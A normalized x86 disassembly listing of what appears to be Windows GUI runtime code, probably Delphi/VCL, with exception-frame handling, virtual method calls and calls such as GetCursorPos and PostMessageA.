jne r-xdata
mov eax edx
retn
sub_3aba61d
jmp sub_3a64b54
sub_3aba6cc
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_3aba6e4
inc [ eax + 0x6c ]
retn
sub_3aba6e8
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_3abc290
sub_3aba848
call sub_3abaf38
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_3abb326
jmp sub_3a64b54
sub_3abb32d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abb352
lea eax [ ebp - 0x44 ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
sub_3abb34b
jmp sub_3a64b54
sub_3abb352
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abb712
jmp sub_3a64b54
sub_3abb719
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abb736
mov eax [ ebp - 0x4 ]
call sub_3a8a234
retn
sub_3abb72f
jmp sub_3a64b54
sub_3abb736
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abb753
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3abb74c
jmp sub_3a64b54
sub_3abb753
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abbc39
jmp sub_3a64b54
sub_3abbc40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abbddf
jmp sub_3a64b54
sub_3abbde6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3abbeec
jmp sub_3a64b54
sub_3abbef3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abc01c
jmp sub_3a64b54
sub_3abc0a3
jmp sub_3a64b54
sub_3abc0aa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abc168
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aba754
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_3abc2b8
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_3aba284
sub_3abc2c8
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_3abca64
cmp dl 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acd89c
call sub_3acc5d8
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acd89c
call sub_3acc60c
retn
sub_3abce29
jmp sub_3a64b54
sub_3abce30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3abcf28
call GetCapture
retn
sub_3abcf30
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_3a6ead0
pop ebx
retn
sub_3abcf40
cmp [ rw-data ] 0x0
setne al
retn
sub_3abcf70
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_3abd1f6
jmp sub_3a64b54
sub_3abd3ec
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_3abd600
jmp sub_3a64b54
sub_3abd607
pop ebx
mov esp ebp
pop ebp
retn
sub_3abd652
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
pop ebx
retn
sub_3abd6fc
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_3abd710
mov [ edx + 0x8 ] 0x3
mov [ edx + 0x10 ] 0x3
mov [ edx + 0xc ] 0x3
mov [ edx + 0x14 ] 0x3
retn
sub_3abd863
jmp sub_3a64b54
sub_3abda38
retn
sub_3abda9b
jmp sub_3a64b54
sub_3abdaa2
pop ebp
retn
sub_3abdb0b
jmp [ edi ]
sub_3abde44
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_3abde88
push ebx
mov ebx eax
mov eax ebx
call sub_3abe5b4
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_3abe5a3
jmp sub_3a64b54
sub_3abe5b4
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_3a919e4
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_3abde58
sub_3abe661
jmp sub_3a64b54
sub_3abe668
pop ebp
retn
sub_3abe868
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_3abea41
jmp sub_3a64b54
sub_3abea48
pop ebx
pop ecx
pop ebp
retn
sub_3abea54
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_3abecac
sub_3abeb01
jmp sub_3a64b54
sub_3abeb08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a64380
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_3abed3e
jmp sub_3a64b54
sub_3abed45
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3abedde
jmp sub_3a64b54
sub_3abede5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abee02
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3abedfb
jmp sub_3a64b54
sub_3abee02
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_3a6457c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abeebb
jmp sub_3a64b54
sub_3abeec2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3abeec8
or edx 0xffffffff
call sub_3abee3c
retn
sub_3abf2db
jmp sub_3a64b54
sub_3abf2e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abf2ff
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3abf2f8
jmp sub_3a64b54
sub_3abf2ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abf31c
mov eax [ ebp - 0x4 ]
call sub_3abfe44
retn
sub_3abf315
jmp sub_3a64b54
sub_3abf31c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abf528
jmp sub_3a64b54
sub_3abf52f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3abf534
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_3a6457c
sub_3abf54c
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_3a78df4
pop ebx
retn
sub_3abf5f0
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_3a7a33c
sub_3abf707
jmp sub_3a64b54
sub_3abf70e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
sub_3abf724
jmp sub_3a64b54
sub_3abfa36
jmp sub_3a64b54
sub_3abfa3d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abfa5a
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
sub_3abfa53
jmp sub_3a64b54
sub_3abfa5a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abfa77
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
sub_3abfa70
jmp sub_3a64b54
sub_3abfa77
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abfae0
jmp sub_3a64b54
sub_3abfbfa
jmp sub_3a64b54
sub_3abfc17
jmp sub_3a64b54
sub_3abfdf6
jmp sub_3a64b54
sub_3abfdfd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3abfe40
inc [ eax + 0x5c ]
retn
sub_3abfe44
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_3a6457c
sub_3abfe98
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_3abfeb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
[ ebx - 0x540077fd ]
sub_3abff5a
out dx eax
push edx
push ecx
[ eax + 0x5 ]
sub_3ac0170
mov esp 0x9803a7c1
0x3a7
sub_3ac01d2
cmpsd [ esi ] [ edi ]
add edx eax
0x3a7
sub_3ac045c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_3a7a4f0
retn
sub_3ac0474
mov al 0x1
retn
sub_3ac0478
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_3a83aac
retn
mov eax edx
retn
sub_3ac0488
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_3a83a7c
retn
mov al 0x1
retn
sub_3ac0778
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a7a494
pop esi
pop ebx
retn
sub_3ac078c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_3ac07c8
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_3ac0a48
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0a5c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0a70
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0a84
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0a98
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0aac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0ac0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0ad4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0ae8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0afc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ac0b10
retn
sub_3ac0b14
retn
sub_3ac0b18
retn
sub_3ac0b1c
retn
sub_3ac0b20
retn
sub_3ac0b24
retn
sub_3ac0b28
retn
sub_3ac0b2c
retn
sub_3ac0b30
retn
sub_3ac0b34
retn
sub_3ac0b38
retn
sub_3ac0b3c
retn
sub_3ac0dec
jmp sub_3a64b54
sub_3ac1210
push esi
mov si 0xffef
call sub_3a6457c
pop esi
retn
sub_3ac12b1
jmp sub_3a64b54
sub_3ac12b8
pop ebp
retn
sub_3ac3a60
mov esi 0x70ffbcff
retn
sub_3ac4024
mov eax [ rw-data ]
retn
sub_3ac402c
mov [ rw-data ] eax
retn
sub_3ac423f
jmp sub_3a648a0
sub_3ac427d
jmp sub_3a64b54
sub_3ac4284
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ac45e6
jmp sub_3a64b54
sub_3ac45ed
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ac463c
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_3ac45f8
retn
xor edx edx
sub_3ac46bd
jmp sub_3a64b54
sub_3ac46c4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ac4758
movzx eax [ eax + 0x1f ]
xor al 0x1
retn
sub_3ac4e94
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_3ac5548
sub_3ac4eb0
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_3ac4e94
sub_3ac4fd0
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_3ac5548
sub_3ac4fe8
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_3ac5548
sub_3ac5000
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_3ac5548
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_3ac502c
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x258 ]
xor al 0x1
retn
sub_3ac503c
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_3ac5548
retn
sub_3ac5320
push ebx
mov ebx edx
mov edx ebx
call sub_3ab3d30
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_3ac5390
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1dc ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1db ] 0x0
je r-xdata
sub_3ac54b8
jmp sub_3a64b54
sub_3ac54bf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ac54c8
push ebx
mov ebx eax
cmp [ ebx + 0x25c ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x250 ]
call sub_3ac48c4
mov eax [ ebx + 0x254 ]
call sub_3ac48c4
sub_3ac5528
push esi
mov esi eax
mov eax [ esi + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3ac5538
push esi
mov esi eax
mov eax [ esi + 0x254 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3ac5633
jmp sub_3a64b54
sub_3ac5640
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_3ac5658
sub_3ac5874
retn
sub_3ac58e4
jmp sub_3a64b54
sub_3ac5933
jmp sub_3a64b54
sub_3ac5968
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_3ab5dd8
retn
mov ecx [ eax + 0x250 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
call sub_3ac4b50
retn
sub_3ac598c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_3ab5df8
retn
mov ecx [ eax + 0x254 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x254 ]
call sub_3ac4b50
retn
sub_3ac5a91
jmp sub_3a64b54
sub_3ac5a98
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3ac47b0
mov eax [ ebp - 0x4 ]
call sub_3ac5548
sub_3ac5b7c
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
call sub_3ab4518
sub_3ac5b90
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_3ac5bc4
retn
sub_3ac5cd4
jmp sub_3a64b54
sub_3ac5d0c
jmp sub_3a64b54
sub_3ac5d13
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac5d33
lea eax [ ebp - 0x114 ]
call sub_3a652a0
retn
sub_3ac5d2c
jmp sub_3a64b54
sub_3ac5d33
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac60c0
jmp sub_3a64b54
sub_3ac60c7
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a64734
sub_3ac611d
jmp sub_3a648a0
sub_3ac6199
jmp sub_3a648a0
sub_3ac619e
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ac65d5
jmp sub_3a64b54
sub_3ac65dc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ac6900
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x2b8 ] eax
pop esi
pop ebx
retn
sub_3ac6918
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ac698c
mov edx eax
mov eax esi
call sub_3a81354
pop esi
pop ebx
retn
sub_3ac6934
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ac8484
mov edx eax
mov eax esi
call sub_3a81354
pop esi
pop ebx
retn
sub_3ac698c
push ebx
mov ebx eax
mov eax ebx
call sub_3ac7fe0
mov edx r-xdata
call sub_3a8a1b8
pop ebx
retn
sub_3ac6a98
push ebx
mov ebx eax
mov eax ebx
call sub_3ac6aa8
xor al 0x1
pop ebx
retn
sub_3ac6aa8
cmp [ eax + 0x258 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x250 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x254 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_3ac6b04
push ebx
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_3ac6b24
push ebx
cmp [ eax + 0x2fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2fc ]
call [ ebx + 0x2f8 ]
sub_3ac6b44
push ebx
cmp [ eax + 0x312 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_3ac6c84
mov edx [ eax + 0x1b4 ]
test edx edx
je r-xdata
xor eax eax
retn
push 0x4
push edx
call GetWindow
retn
sub_3ac6e63
jmp sub_3a64b54
sub_3ac6e6a
pop ecx
pop ebp
retn
sub_3ac6e70
xor eax eax
retn
sub_3ac6f24
jmp sub_3a64b54
sub_3ac72f2
jmp sub_3a64b54
sub_3ac72f9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3ac730f
jmp sub_3a64b54
sub_3ac73f9
jmp sub_3a64b54
sub_3ac7400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac741d
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3ac7416
jmp sub_3a64b54
sub_3ac743d
jmp sub_3a64b54
sub_3ac7732
jmp sub_3a64b54
sub_3ac78c8
jmp sub_3a64b54
sub_3ac7fe0
mov eax [ eax + 0x280 ]
retn
sub_3ac7fe8
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3ac7ff4
movzx eax [ eax + 0x5e ]
xor al 0x1
retn
sub_3ac818c
jmp sub_3a64b54
sub_3ac8474
jmp sub_3a64b54
sub_3ac847b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ac8484
mov eax [ eax + 0x2a4 ]
mov eax [ eax ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_3ac852c
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_3ab4518
sub_3ac85fc
mov eax [ eax + 0x2a4 ]
cmp [ eax ] 0x0
setne al
retn
sub_3ac8640
push ebx
mov ebx eax
mov eax ebx
call sub_3ab713c
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_3a89b20
sub_3ac86c4
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7164
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_3a8a25c
sub_3ac86e4
push ebx
mov ebx eax
mov eax ebx
call sub_3ac8198
mov edx [ ebx + 0x290 ]
mov eax ebx
call sub_3ac8260
pop ebx
retn
sub_3ac9379
lea eax [ ebp - 0xb4 ]
call sub_3a652a0
retn
sub_3ac9385
jmp sub_3a64b54
j_sub_3ac9379
jmp sub_3ac9379
sub_3ac938c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ac94be
jmp sub_3a64b54
sub_3ac9664
jmp sub_3a64b54
sub_3ac966b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ac995d
jmp sub_3a64b54
sub_3ac9964
mov eax [ rw-data ]
call sub_3acc97c
mov [ ebp - 0x5 ] 0x1
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ac9982
add [ eax ] al
retn
sub_3ac9c08
push ebx
cmp [ eax + 0x302 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
sub_3ac9c28
mov eax [ eax + 0x288 ]
call sub_3a8fdc8
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_3aceb7c
sub_3ac9dcf
jmp sub_3a64b54
sub_3ac9e1c
jmp sub_3a64b54
sub_3ac9e23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac9e46
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_3a8a234
retn
sub_3ac9e3f
jmp sub_3a64b54
sub_3ac9e46
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aca02c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ac9c28
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_3aca170
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_3ab6eac
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_3aca3dc
mov ecx [ eax + 0x290 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_3aa7bd4
sub_3aca4c7
jmp sub_3a64b54
sub_3aca4ce
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aca550
call sub_3acb504
retn
sub_3aca558
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_3aca9b2
jmp sub_3a64b54
sub_3aca9b9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3acae34
jmp sub_3a648a0
sub_3acb292
jmp sub_3a648a0
sub_3acb3c0
jmp sub_3a64b54
sub_3acb3c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acb3e4
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
sub_3acb3dd
jmp sub_3a64b54
sub_3acb3e4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3acb3ec
push ebx
mov ebx eax
mov eax [ ebx + 0x288 ]
call sub_3a8fdc8
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_3ac6a3c
sub_3acb40c
call sub_3a64380
retn
sub_3acb464
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_3acb4ca
jmp sub_3a64b54
sub_3acb679
jmp sub_3a648a0
sub_3acb6a4
xor edx edx
call sub_3ac6dc0
retn
sub_3acb743
jmp sub_3a64b54
sub_3acb74a
pop ebx
pop ecx
pop ebp
retn
sub_3acb780
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_3ab7c38
push eax
call PostMessageA
pop ebx
retn
sub_3acb9ae
jmp sub_3a64b54
sub_3acba4f
jmp sub_3a64b54
sub_3acba59
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acba78
mov eax [ rw-data ]
call sub_3acdfd0
retn
sub_3acba71
jmp sub_3a64b54
sub_3acba78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acba95
lea eax [ ebp - 0x20 ]
call sub_3a652a0
retn
sub_3acba8e
jmp sub_3a64b54
sub_3acba95
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3acbbcc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_3acd4d8
retn
retn
call sub_3aaede8
sub_3acbf74
mov edx eax
mov eax [ rw-data ]
call sub_3acf68c
mov al 0x1
retn
sub_3acc05c
cmp dl [ eax + 0x328 ]
je r-xdata
retn
mov [ eax + 0x328 ] dl
call sub_3acbf84
sub_3acc070
cmp dl [ eax + 0x329 ]
je r-xdata
retn
mov [ eax + 0x329 ] dl
call sub_3acbf84
sub_3acc084
cmp edx [ eax + 0x354 ]
je r-xdata
retn
mov [ eax + 0x354 ] edx
call sub_3acbf84
sub_3acc0d8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x328 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x350 ] 0x0
je r-xdata
sub_3acc2c8
jmp sub_3a64b54
sub_3acc2cf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3acc2d8
push ebx
mov ebx eax
mov eax ebx
call sub_3ab6460
mov eax ebx
call sub_3ab65ec
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3acb780
sub_3acc559
jmp sub_3a64b54
sub_3acc560
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3acc568
push ebx
mov ebx edx
mov edx ebx
call sub_3ab6908
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_3aaef04
pop ebx
retn
sub_3acc5c0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_3acc628
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_3acc5d8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_3acc628
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_3acc5f4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_3acc628
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_3acc60c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_3acc628
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_3acc8cc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acc8d8
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acc8e4
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acc8f0
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acc8fc
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acc908
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acc944
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_3a7a494
pop esi
pop ebx
retn
sub_3acc958
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_3acc960
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
pop esi
pop ebx
retn
sub_3acc974
